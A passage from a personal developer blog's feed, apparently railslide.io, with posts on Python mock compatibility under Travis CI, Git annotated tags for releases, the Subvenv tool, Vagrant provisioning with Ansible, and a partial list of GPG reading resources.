&lt;p&gt;That of course didn't work in Python 2, since there the module is called &lt;code&gt;__builtin__&lt;/code&gt;. So, after a hacky and unsuccessful attempt, I ended up in rewriting my mock in a more specific and robust way. Instead of patching the function within the Builtins module, I patched the function &lt;em&gt;call&lt;/em&gt; made inside my module:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;patch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;subvenv.core.open&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;In this way, there's no need to worry about where the function comes from, since all it matters is that it gets called within my module's namespace.&lt;/p&gt;
&lt;h2&gt;Python 2.6 and Unittest, Python 3.2 and Pip&lt;/h2&gt;
&lt;p&gt;In the meanwhile, Python 2.6 was throwing its own kind of errors. That wasn't a big problem either, since I had added it to list of interpreters mostly out of curiosity. Nevertheless, I did a check on the errors and investigated its causes a bit and it came out that before 2.7 it wasn't possible to use &lt;code&gt;self.AssertRaises&lt;/code&gt; as a context manager (see &lt;a href="https://docs.python.org/2/library/unittest.html#unittest.TestCase.assertRaises"&gt;here&lt;/a&gt; and &lt;a href="https://bugs.python.org/issue4444"&gt;here&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;Supporting Python 2.6 has never been on my roadmap and adapting my tests to it didn't seem worth the effort, so I didn't think twice about ditching it from the interpreters list.&lt;/p&gt;
&lt;p&gt;Python 3.2 ended up sharing the same fate as Python 2.6, since I discovered that Pip no longer supports it. Thus, due to the impossibility to install the necessary dependencies, I decided to simply follow Pip's example and remove also Python 3.2 from my Travis configuration file.&lt;/p&gt;
&lt;h2&gt;Which mock?&lt;/h2&gt;
&lt;p&gt;Ok, so back to my mocks! Now they get imported and patch what they need to patch, but still don't seem to work as expected. Or rather, it looks like there's something off with the &lt;code&gt;mock_open&lt;/code&gt; helper, since for some reason it returns a &lt;code&gt;MagicMock&lt;/code&gt; instance instead of the specified &lt;code&gt;read_data&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;After a bit of head scratching and googling, I found a &lt;a href="https://github.com/travis-ci/travis-ci/issues/5849"&gt;feature request&lt;/a&gt; to Travis that shaded light over my own problem. Thanks to it I got to discover that Travis runs an old version of Mock (I haven't figured out which one exactly, but for sure older than 1.3.0) which does not implement &lt;code&gt;mock_open&lt;/code&gt; as later versions do. Thankfully the same issue suggested also a workaround for it, i.e. to add an explicit install command for the desired version to the configuration file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;install&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p p-Indicator"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;pip install .&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p p-Indicator"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;pip install mock==2.0&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p p-Indicator"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;pip install -r requirements.txt&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;Mock and Python 3.3&lt;/h2&gt;
&lt;p&gt;Ok, after the latest changes, I managed to add Python 2.7 to the list of successful builds. However, Python 3.3 shows up still in red and the error message is basically the same one I got when I add the Mock version issue in Python 2.7. That's weird!&lt;/p&gt;
&lt;p&gt;Just to be sure, I double checked: yes, Mock is already part of the Unittest module in Python 3.3 and yes, its implementation of the &lt;code&gt;mock_open&lt;/code&gt; does take &lt;code&gt;read_data&lt;/code&gt; as an argument. However, as the documentation specifies, the &lt;code&gt;readline&lt;/code&gt; and &lt;code&gt;readlines&lt;/code&gt; method have been added in version 3.4, hence my error.&lt;/p&gt;
&lt;p&gt;Ok, let's flip the imports then, so that the external library gets tried first:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;mock&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;patch&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;mock_open&lt;/span&gt;
&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;ImportError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;unittest.mock&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;patch&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;mock_open&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And finally, all green!&lt;/p&gt;
&lt;h2&gt;All in all&lt;/h2&gt;
&lt;p&gt;Phew! That was quite an amount of trials and errors - especially considering that I was expecting to be done with it in half an hour or so!&lt;/p&gt;
&lt;p&gt;It is a bit sad to think that if I would have coded Subvenv in Python 2.7 I would have spared myself quite some headaches. Also, I am still not super happy to have to rely on an external backport of a built-in module in order to continuously integrate my code.&lt;/p&gt;
&lt;p&gt;But hey, the bright side is that I got to learn a lot from it! While there have been moments when the thought of giving up has surfaced my mind, the whole process has been a super interesting travel through how different things are implemented in different versions of Python, as well as how to write code that is compatible with them. Also, code gets now automatically tested when opening a pull request, which is great. So yeah, I guess I can call it a long but profitable afternoon!&lt;/p&gt;</content><category term="dev"></category><category term="travis-ci"></category><category term="python"></category><category term="python3"></category><category term="mock"></category></entry><entry><title>How to release your code (aka Git tags)</title><link href="https://railslide.io/how-to-release-aka-git-tags.html" rel="alternate"></link><published>2016-04-02T00:00:00+02:00</published><updated>2016-04-02T00:00:00+02:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2016-04-02:/how-to-release-aka-git-tags.html</id><summary type="html">&lt;p&gt;After spending quite some time working on your side project, you feel that it is finally good enough for going public. Releasing sounds like a super neat idea, but how do you do it?&lt;/p&gt;</summary><content type="html">&lt;p&gt;After spending quite some time working on your side project, you feel that it is finally good enough for going public. Releasing sounds like a super neat idea, but how do you do it?&lt;/p&gt;
&lt;h2&gt;Releasing through Github&lt;/h2&gt;
&lt;p&gt;Github provides a very straightforward release interface. All you need to do is to click on the releases counter, press the &lt;em&gt;"Create a new release"&lt;/em&gt; button, fill the form, submit, and you're done. Github also offer the possibility to draft releases - which comes in handy if you want to start preparing the release while still working on the code for it - or pre-releases, in case your code is not really stable yet.&lt;/p&gt;
&lt;p&gt;Github also provides you with a fancy link in the form of github.com/Username/repo/releases/latest, which will allow people to get directly to the latest release, no matter its number.&lt;/p&gt;
&lt;h2&gt;Releasing from the command line (with Git tags)&lt;/h2&gt;
&lt;p&gt;Github interface it is certainly nice, but it comes to the price of making your release workflow dependent on Github. What if a certain point you decide that you want to move your code away from Github? Also wouldn't be awesome if you could take care of your releases directly from your trusted terminal? Well, it turns out that you can, since what Github does behind the scene is to create and set a Git tag on the repository.&lt;/p&gt;
&lt;p&gt;Tags in Git are a way to set a reference to a specific point in history. You can think of them as a way to &lt;em&gt;bookmark&lt;/em&gt; a specific commit. So when you download the source code for your-awesome-project.v1.1.0 you're basically saying "Hey Git, fetch me the code up to the point that correspond to the commit tagged with the name your-awesome-project.v1.1.0".&lt;/p&gt;
&lt;p&gt;You can set a tag with the &lt;code&gt;git tag&lt;/code&gt; command. However, before you go git-tagging all the things, you should probably be aware that there are two kinds of tags in Git: annotated and lightweight. As the man page for &lt;code&gt;git-tag&lt;/code&gt; explains:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;Tag&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;objects&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;created&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;with&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;or&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nx"&gt;u&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;are&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;called&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;annotated&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;tags&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nx"&gt;they&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;contain&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;creation&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;date&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;tagger&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;and&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nx"&gt;mail&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;tagging&lt;/span&gt;
&lt;span class="nx"&gt;message&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;and&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;an&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;optional&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;GnuPG&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;signature&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;Whereas&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;lightweight&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;tag&lt;/span&gt;
&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;simply&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;an&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;object&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;usually&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;commit&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;object&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;

&lt;span class="nx"&gt;Annotated&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;tags&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;are&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;meant&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;release&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;lightweight&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;tags&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;are&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;meant&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;private&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;or&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;temporary&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;object&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;labels&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;For&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;this&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;reason&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;some&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;git&lt;/span&gt;
&lt;span class="nx"&gt;commands&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;naming&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;objects&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;like&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;git&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;describe&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;will&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;ignore&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;lightweight&lt;/span&gt;
&lt;span class="nx"&gt;tags&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;by&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;To be honest, I still haven't yet figured out a good case for lightweight tags - if you have, give me a shout 'cause I'd love to know! Anyways, the bottom line is: &lt;strong&gt;do not forget the &lt;code&gt;-a&lt;/code&gt; flag when you're trying to make a release&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Ok, back to our release!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;git&lt;span class="w"&gt; &lt;/span&gt;tag&lt;span class="w"&gt; &lt;/span&gt;-a&lt;span class="w"&gt; &lt;/span&gt;v1.0.0&lt;span class="w"&gt; &lt;/span&gt;-m&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;My awesome message for v1.0.0&amp;quot;&lt;/span&gt;
$&lt;span class="w"&gt; &lt;/span&gt;git&lt;span class="w"&gt; &lt;/span&gt;push&lt;span class="w"&gt; &lt;/span&gt;--tags&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="c1"&gt;# tags need to be pushed explicitly&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Done!&lt;/p&gt;
&lt;h2&gt;Happy ending? Almost...&lt;/h2&gt;
&lt;p&gt;OK, so after pushing your latest release via command line, you go an check Github to see if everything worked as expected. The counter increased - which is good - but if you had done any previous release via GUI the releases page might not look exactly how you would have expected it. In fact, even though Github correctly displays your tags, it doesn't mark it as the latest relase.&lt;/p&gt;
&lt;p&gt;The reason for that is that at the time of writing Github doesn't fully support releases made via command line. That's a bummer and unfortunately there's nothing we can do other than hoping that the folk at Github will implement it soon.&lt;/p&gt;
&lt;p&gt;However, leaving it as it is doesn't really qualify as an option since having a flag and a direct link pointing to the wrong release is worse than not having them at all. So what our workaround options? We could use the Github interface to mark a tag as the latest release, though it would add extra manual work to the release process and - again - making it dependent on Github. Alternatively it possible is to remove the Github sugarcoat from previous releases, so that the &lt;em&gt;latest release&lt;/em&gt; flag disappears. The downside of doing so is that the direct link to the latest release won't work anymore.&lt;/p&gt;
&lt;p&gt;Unfortunately, every workaround has its flaws, so which one would work best depends on what your needs are and what compromises you're ready to make. Other than that, happy releasing!&lt;/p&gt;</content><category term="dev"></category><category term="git"></category><category term="github"></category><category term="release"></category></entry><entry><title>Subvenv</title><link href="https://railslide.io/subvenv-v1-0.html" rel="alternate"></link><published>2016-03-01T00:00:00+01:00</published><updated>2016-03-01T00:00:00+01:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2016-03-01:/subvenv-v1-0.html</id><summary type="html">&lt;p&gt;Subvenv 1.0 is out! What it is, why I wrote it, and why you might want to use it.&lt;/p&gt;</summary><content type="html">&lt;p&gt;A couple of days ago I released and upload to PyPI the first stable release of &lt;a href="https://github.com/Railslide/subvenv"&gt;Subvenv&lt;/a&gt;. Besides being a labor of love, Subvenv is an utility for creating virtualenv-friendly Sublime Text project files.&lt;/p&gt;
&lt;p&gt;The reason why I wrote it is that I am lazy and I love to have computers taking care of boring and repetitive tasks on my behalf. More specifically, I wasn't super happy with my typical workflow for starting a new project, since it required me a certain number of steps before being finally able to crunch some code.&lt;/p&gt;
&lt;p&gt;Here's what my workflow used to look like:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;create a Virtualenvwrapper project&lt;/li&gt;
&lt;li&gt;open Sublime Text&lt;/li&gt;
&lt;li&gt;create a Sublime Text project&lt;/li&gt;
&lt;li&gt;add the previously created folder to the project file&lt;/li&gt;
&lt;li&gt;add the virtual environment interpreter path to the project file, so that linting plugins could pick that instead of the global one (and stop complaining about missing imports!)&lt;/li&gt;
&lt;li&gt;Start coding&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now with Subvenv instead:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;create a Virtualenvwrapper project&lt;/li&gt;
&lt;li&gt;open Sublime Text&lt;/li&gt;
&lt;li&gt;open the Sublime Text project&lt;/li&gt;
&lt;li&gt;Start coding&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Way faster and less error prone! So, why not sharing it? I cleaned up the code a bit, made it more virtual environment management agnostic, and uploaded it on PyPI. Now it's out there. If you use Sublime Text you might want to have a look it - it may speed up your workflow too :)&lt;/p&gt;</content><category term="dev"></category><category term="subvenv"></category><category term="announcements"></category><category term="virtual environments"></category><category term="python"></category></entry><entry><title>Provisioning Vagrant with Ansible</title><link href="https://railslide.io/provisioning-vagrant-with-ansible.html" rel="alternate"></link><published>2016-02-05T00:00:00+01:00</published><updated>2016-02-05T00:00:00+01:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2016-02-05:/provisioning-vagrant-with-ansible.html</id><summary type="html">&lt;p&gt;Vagrant is an amazing tool. However, one thing that bugged me was that provisioning scripts preparation still required me a fair amount of time and trial-errors attempts. Switching to Ansible allowed me to make my life easier and provision times shorter.&lt;/p&gt;</summary><content type="html">&lt;p&gt;When I started using Vagrant I picked bash as my provisioning tool. It looked as the most logical choice as I was already familiar with the command line. It served me well - I brought up a fair amount of virtual machines with it - but the process of getting the provision scripts still gave me some annoyances.&lt;/p&gt;
&lt;p&gt;First of all, running a non-interactive installation adds an extra layer of complexity, since you don't always know (or think about) how an interactive command will behave in an unattended installation. For me that often translated itself into: run provision, get a more or less cryptic message, ssh into the machine, run the command manually, figure out what went wrong, edit the provision script, rinse, and repeat.&lt;/p&gt;
&lt;p&gt;Then, the provision script runs from top to bottom every time a provision is run - no matter whether the machine has been already partially provisioned. You could throw in a bunch of conditional statements in order to skip the already performed steps, but that would come with the price of adding further complexity to the provisioning script.&lt;/p&gt;
&lt;p&gt;Finally, you have to &lt;em&gt;echo all the things&lt;/em&gt; in order to keep track of the different installation steps - reducing thus the readability of the script.&lt;/p&gt;
&lt;p&gt;Of course these are trivial problems and I've happily coped with them for quite some time. But then I had the chance to have a look at Ansible - and it has been a game changer!&lt;/p&gt;
&lt;p&gt;Ansible uses yaml as a language for its orchestration files (aka playbook), which makes them extremely easy to read. For example, this is how a task for installing Git could look&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p p-Indicator"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;Install git&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="nt"&gt;sudo&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;yes&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="nt"&gt;apt&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;pkg=git state=latest&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Pretty easy to figure out what it does! On top of that, Ansible outputs the name of your tasks when running them, making it trivial for you to keep track of what's going on behind the scenes.&lt;/p&gt;
&lt;p&gt;Then there are modules, like &lt;code&gt;apt&lt;/code&gt; in the example above, which are basically wrappers for the most common operations. There are lots of them, so there's a very high chance that you'll find a module for the command you need to run. And in case you don't, you can always use the shell module to run your command as you would type it in the terminal.&lt;/p&gt;
&lt;p&gt;Besides making your life easier when it comes to write provision scripts, Ansible also makes the process of running them way faster. In fact, &lt;em&gt;idempotency&lt;/em&gt; is one of the key concept of Ansible modules, which basically means that they won't execute if their target state has already been reached. So, if you resume a partial provisioning, Ansible will skip all the previously performed tasks.&lt;/p&gt;
&lt;p&gt;Last but not least, Ansible is written in Python which is a nice plus. Unfortunately it does not support Python 3, but I guess I'll have to live with it for the time being.&lt;/p&gt;
&lt;p&gt;It is probably worthy mentioning that Ansible doesn't natively run on Windows. Fortunately the &lt;a href="http://phansible.com"&gt;Phansible team&lt;/a&gt; came up with a workaround for it: using a shell provision to install Ansible on the guest and the run provision from there. It is a bit slower than running Ansible locally, but works great for projects with cross platforms contributors. Alternatively, I heard of people being able to run Ansible with cgywin, but I have no clues about what it takes to make it happen.&lt;/p&gt;
&lt;p&gt;All in all, I would warmly recommend to give Ansible a try - especially if you are currently using bash for provisioning your vagrant machines. Here some links to get you started:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ansible.com/"&gt;Ansible&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.ansible.com"&gt;Ansible docs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.vagrantup.com/v2/provisioning/ansible.html"&gt;Vagrant docs - provisioning with Ansible&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Happy provisioning!&lt;/p&gt;</content><category term="dev"></category><category term="vagrant"></category><category term="ansible"></category><category term="automatization"></category></entry><entry><title>Some great reading resources about GPG</title><link href="https://railslide.io/gpg-reading-resources.html" rel="alternate"></link><published>2015-06-17T00:00:00+02:00</published><updated>2015-06-17T00:00:00+02:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2015-06-17:/gpg-reading-resources.html</id><summary type="html">&lt;p&gt;A bunch of pretty awesome reading resources about GPG and cryptography.&lt;/p&gt;</summary><content type="html">&lt;p&gt;While setting up my GPG keyring, I stumbled upon quite some interesting reading resources about PGP/GPG and cryptography in general. I collected them in this blog post in case they could come in handy for someone else or for future reference.&lt;/p&gt;
&lt;p&gt;Happy reading!&lt;/p&gt;
&lt;h2&gt;Cryptography in general&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.philzimmermann.com/EN/essays/WhyIWrotePGP.html"&gt;Why I Wrote PGP (Philip Zimmermann)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.autistici.org/en/stuff/man_mail/privacymail.html"&gt;Protecting your privacy: how and why (Autistici/Inventati)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.gnupg.org/gph/en/manual/book1.html"&gt;The GNU Privacy Handbook&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Key creation&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.debian.org/Subkeys"&gt;Debian wiki about Subkeys&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.void.gr/kargig/blog/2013/12/02/creating-a-new-gpg-key-with-subkeys/"&gt;Creating a new GPG key with subkeys (void.gr)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://alexcabal.com/creating-the-perfect-gpg-keypair/"&gt;Creating the perfect GPG keypair (Alex Cabal)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.debian-administration.org/article/451/Submitting_your_GPG_key_to_a_keyserver"&gt;Submitting your GPG key to a keyserver (Debian Administration)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://openpgpblog.tumblr.com/post/219954494/photos-on-pgp-keys"&gt;Photos on PGP keys (OpenPGP Blog)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.spywarewarrior.com/uiuc/ss/revoke/pgp-revoke.htm"&gt;Creating a Key Revocation Certificate in PGP (spywarewarriors.com)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;GPG + Email&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://lifehacker.com/180878/how-to-encrypt-your-email"&gt;How to encrypt your email (Lifehacker)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.enigmail.net/home/index.php"&gt;Enigmail&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://mailpile.is"&gt;Mailpile&lt;/a&gt;&lt;/li&gt;
